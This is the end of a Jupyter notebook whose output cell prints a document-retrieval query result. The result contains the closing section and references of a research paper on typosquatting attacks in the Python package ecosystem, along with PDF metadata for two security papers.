promising to be used in future\\nresearch for automatic identi\\ufb01cation of malicious packages in\\nPyPI and has the potential for creating an automatic system\\nthat prevents squatting attacks in the PyPI ecosystem.\\nFor the future work, we plan to extend the approach to\\nemploy the code level checks of the identi\\ufb01ed packages so\\nthat it will be capable of automatically identifying injected\\nmalicious code snippets into Python packages. Additionally,\\nwe plan to explore the applicability of the approach to other\\nsoftware ecosystems, like NPM or Maven.\\nACKNOWLEDGMENTS\\nThis research has been partly funded by the EU under the\\nH2020 Programs H2020-EU.2.1.1-CyberSec4Europe (Grant\\nNo. 830929), the NeCS: European Network for Cyber Security\\n(Grant No. 675320) and the SP ART A project (Grant No.\\n830892).\\nREFERENCES\\n[1] N. P . Tschacher, \\u201cTyposquatting in programming language package man-\\nagers,\\u201d Bachelor\\u2019s Thesis, Universit\\u00e4t Hamburg, Fachbereich Informatik.\\n[2] A. Z. Robert Perica, \\u201cSuppy chain malware - detecting malware in pack-\\nage manager repositories,\\u201d https://blog.reversinglabs.com/blog/suppy-\\nchain-malware-detecting-malware-in-package-manager-repositories.\\n[3] S. Stagg, \\u201cBuilding a botnet on pypi,\\u201d https://hackernoon.com/building-\\na-botnet-on-pypi-be1ad280b8d6, 2017.\\n[4] V . I. Levenshtein, \\u201cBinary codes capable of correcting deletions, inser-\\ntions, and reversals,\\u201d inSoviet physics doklady, 1966.\\n[5] Y . Hu, H. Wang, R. He, L. Li, G. Tyson, I. Castro, Y . Guo, L. Wu, and\\nG. Xu, \\u201cMobile app squatting,\\u201d inProc. of WWW\\u20192020, 2020.\\n[6] P . Kintis, N. Miramirkhani, C. Lever, Y . Chen, R. Romero-G\\u00f3mez,\\nN. Pitropakis, N. Nikiforakis, and M. Antonakakis, \\u201cHiding in plain sight:\\nA longitudinal study of combosquatting abuse,\\u201d inProc. of CCS\\u201917.\\n[7] I. Pashchenko, D. L. Vu, and F. Massacci, \\u201cA qualitative study of depen-\\ndency management and its security implications,\\u201d inProc. of CCS\\u201920.\\n[8] M. Taylor, R. K. V aidya, D. Davidson, L. De Carli, and V . Rastogi,\\n\\u201cSpellbound: Defending against package typosquatting,\\u201darXiv preprint.\\n[9] R. Duan, O. Alrawi, R. P . Kasturi, R. Elder, B. Saltaformaggio, and\\nW . Lee, \\u201cMeasuring and preventing supply chain attacks on package\\nmanagers,\\u201darXiv preprint.\\n514\\nAuthorized licensed use limited to: Oracle. Downloaded on March 25,2025 at 09:11:16 UTC from IEEE Xplore.  Restrictions apply. \"\n",
      "    ]\n",
      "  ],\n",
      "  \"uris\": null,\n",
      "  \"data\": null,\n",
      "  \"metadatas\": [\n",
      "    [\n",
      "      {\n",
      "        \"/CreationDate\": \"D:20210913202330+05'30'\",\n",
      "        \"/Creator\": \"Aspose Pty Ltd.\",\n",
      "        \"/ModDate\": \"D:20250325022231-07'00'\",\n",
      "        \"/Producer\": \"Aspose.PDF for .NET 23.2.0; modified using iText 4.2.0 by 1T3XT\",\n",
      "        \"/Subject\": \"Security and Communication Networks 2021.2021:9923234\",\n",
      "        \"/Title\": \"PBDT: Python Backdoor Detection Model Based on Combined Features\",\n",
      "        \"/WPS-ARTICLEDOI\": \"10.1155/2021/9923234\",\n",
      "        \"/WPS-JOURNALDOI\": \"10.1155/2037\",\n",
      "        \"/WPS-PROCLEVEL\": \"3\"\n",
      "      },\n",
      "      {\n",
      "        \"/CreationDate\": \"D:20201014200339Z\",\n",
      "        \"/IEEE Article ID\": \"9229803\",\n",
      "        \"/IEEE Issue ID\": \"9229648\",\n",
      "        \"/IEEE Publication ID\": \"9229477\",\n",
      "        \"/Meeting Ending Date\": \"11 Sept. 2020\",\n",
      "        \"/Meeting Starting Date\": \"7 Sept. 2020\",\n",
      "        \"/ModDate\": \"D:20201020162348-04'00'\",\n",
      "        \"/Producer\": \"OpenPDF 1.0.0-SNAPSHOT; modified using iText\\u00ae 7.1.1 \\u00a92000-2018 iText Group NV (AGPL-version)\",\n",
      "        \"/Subject\": \"2020 IEEE European Symposium on Security and Privacy Workshops (EuroS&PW);2020; ; ;10.1109/EuroSPW51379.2020.00074\",\n",
      "        \"/Title\": \"Typosquatting and Combosquatting Attacks on the Python Ecosystem\"\n",
      "      }\n",
      "    ]\n",
      "  ],\n",
      "  \"distances\": [\n",
      "    [\n",
      "      1.6858381032943726,\n",
      "      1.8137046098709106\n",
      "    ]\n",
      "  ],\n",
      "  \"included\": [\n",
      "    \"distances\",\n",
      "    \"documents\",\n",
      "    \"metadatas\"\n",
      "  ]\n",
      "}\n"
     ]
    }
   ],
   "source": [
    "import json\n",
    "\n",
    "print(json.dumps(results,indent=2))"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "59529643",
   "metadata": {},
   "outputs": [],
   "source": []
  }
 ],
 "metadata": {
  "kernelspec": {
   "display_name": "env",
   "language": "python",
   "name": "python3"
  },
  "language_info": {
   "codemirror_mode": {
    "name": "ipython",
    "version": 3
   },
   "file_extension": ".py",
   "mimetype": "text/x-python",
   "name": "python",
   "nbconvert_exporter": "python",
   "pygments_lexer": "ipython3",
   "version": "3.11.0"
  }
 },
 "nbformat": 4,
 "nbformat_minor": 5
}
